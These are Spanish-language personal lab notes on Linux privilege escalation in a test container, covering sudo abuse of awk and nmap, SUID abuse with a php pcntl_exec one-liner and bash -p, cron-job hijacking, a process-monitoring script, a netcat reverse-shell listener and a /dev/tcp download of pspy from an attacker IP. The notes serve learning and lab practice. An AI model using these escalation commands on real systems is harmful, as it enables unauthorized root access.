
desplegamos un contenedor bash de ubuntu latest
![[Pasted image 20250419165145.png]]
creamos un perfil utilizando useradd -d /home/ken -s /bin/bash -m ken

---------------
Privilegios a nivel de SUDOERS

sudo -l lista privilegio que podemos acceder o ejecutar 
es decir aparece la lista de cosas que se pueden ejecutar como root
En este caso listamos
![[Pasted image 20250419170149.png]]

Vemos que podemos ejecutar awk como root entonces para ello accedemos a la pagina
[awk | GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell)
y filtramos por awk 
En la seccion Sudo vemos que podemos ejecutar una bash como usuario root

Ejemplo 2
usamos sudo -l para listar sudoers
Observamos que tenemos nmap como sudoer
Nos metemos al directorio tmp
creamos una bash dentro de un archivo .nse
y por medio del usuario manolo ejecutamos nmap con el script y PWNED
ganamos acceso
y podemos crear una bash del usuario manolo

![[Pasted image 20250419170849.png]]

Ya dentro podemos crear una revershell con nc -nlvp 443
Para mayor comodidad y hacemos un tratamiento de la TTI

----------------
------------
PRIVILEGIOS SUID
Asi se asignan
chmod u+s
se muestran de la siguiente manera
![[Pasted image 20250419221148.png]]
Para abusar de ellos podemos ingresar a gtfobins y filtrar por php en este caso
```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

![[Pasted image 20250419221337.png]]

utilizamos bash -p para generar una bash como root y elevar privilegios

Buscar Privilegios SUID
find / -perm -4000 2>/dev/null

-----------------------
Tareas Cron
Se ejecutan en el sistema a intervalos regulares de tiempo

lo instalamos
apt install cron
service start cron
crontab -e

ingresamos * * * * *  /bin/bash  /tmp/script.sh
Quiero que el usuario ejecute una bash que esta en script.sh en tmp

Creamos el script.sh dentro de /tmp/
![[Pasted image 20250419222404.png]]
podemos observar que se crea el output con el contenido de root de quien es el que lo ejecuta


Ahora ¿Como podemos saber que se esta ejecutando esta tarea si no sabemos que existe?

Ingresamos a /dev/shm
touch procmon.sh
![[Pasted image 20250419222820.png]]
Esto te indica cual es el usuario y comando que se ha ejecutado

nano procmon.sh

Ingresamos lo siguiente:

`#!/bin/bash`

`old_process=$(ps -eo user,command)`

`while true; do`
    `new_process=$(ps -eo user,command)`
    `diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"`
    `old_process=$new_process`
    `sleep 1`
`done`



### 1. `#!/bin/bash`

Esto es el **shebang**, que indica que el script debe ejecutarse con el intérprete de **Bash**.

---

### 2. `old_process=$(ps -eo user,command)`

Se guarda en la variable `old_process` una lista de los procesos actuales.  
Este comando muestra los procesos en ejecución con:

- `-e`: todos los procesos
    
- `-o user,command`: salida personalizada con el **usuario** que ejecuta el proceso y el **comando** usado.
    

---

### 3. `while true; do`

Esto inicia un **bucle infinito**. El script va a estar corriendo constantemente, comparando el estado de los procesos.

> ⚠️ En tu script hay un typo: escribiste `ture` en lugar de `true`. Eso hará que el script falle. Corrígelo a `true`.

---

### 4. `new_process=$(ps -eo user,command)`

Se guarda una nueva lista de procesos (actualizada) en la variable `new_process`.

---

### 5. `diff <(echo "$old_process") <(echo "$new_process")`

Este comando compara las dos listas de procesos (antes y después) usando `diff`.  
`<(...)` es una **sustitución de proceso**, que le da a `diff` dos entradas "tipo archivo" para comparar.

---

### 6. `| grep "[\>\<]"`

Filtra la salida del `diff` para mostrar solo las líneas que cambian:

- `<`: líneas que estaban antes pero ya no están (procesos terminados)
    
- `>`: líneas que no estaban antes pero ahora sí (procesos nuevos)
    

---

### 7. `| grep -vE "procmon|command|kworker"`

Este filtro **excluye** de la salida cualquier línea que contenga:

- `procmon`: probablemente para que el script no se detecte a sí mismo.
    
- `command`: elimina la línea del encabezado.
    
- `kworker`: ignora procesos del kernel que aparecen y desaparecen constantemente (ruido).
    

---

### 8.`old_process=$new_process`

Después de cada comparación, **deberías actualizar** `old_process` para que la próxima vuelta del bucle compare con el estado actual. De lo contrario, siempre se compara contra el estado original del script, lo cual no es útil en un monitoreo continuo.
![[Pasted image 20250419223802.png]]
Una vez quedaria asi 
![[Pasted image 20250419223927.png]]

Al tener malos permisos vamos a abusar del script y vamos a modificar su contenido de la siguiente manera

![[Pasted image 20250419224053.png]]

watch -n 1 ls -l /bin/bash

Ejecutamos esto para ver en cada segundo ver el permiso de este archivo
watch -n 1 ls -l /bin/bash


![[Pasted image 20250419224223.png]]
Ahora vemos que hay suid y escalaremos a root
![[Pasted image 20250419224300.png]]

Otra forma de detectar esta tarea en vez de ejecutar el script podemos utilizar la herramienta pspy64 de github

Una vez descargado vamos a transferirlo desde nuestra maquina de atacante a la maquina victima
![[Pasted image 20250419224709.png]]
Ejecutamos esto por netcat para compartirnos el archivp pspy

Desde la maquina victima ejecutamos

		cat < /dev/tcp/192.168.1.69/443 > pspy

Para corroborar que se ha transferido el archivo sin ningun error (en su integridad total)
podemos aplicar un `md5sum pspy   o   md5sumpspy64`
Comparamos ambos hashes y verificamos que esten iguales
![[Pasted image 20250419225043.png]]

le damos permisos de ejecucion `chmod +x pspy ` y lo ejecutamos en la maquina victima
![[Pasted image 20250419225314.png]]
Aqui ya con pspy podemos observar las tareas que se ejecutan icnluso con el PID

-------------------------
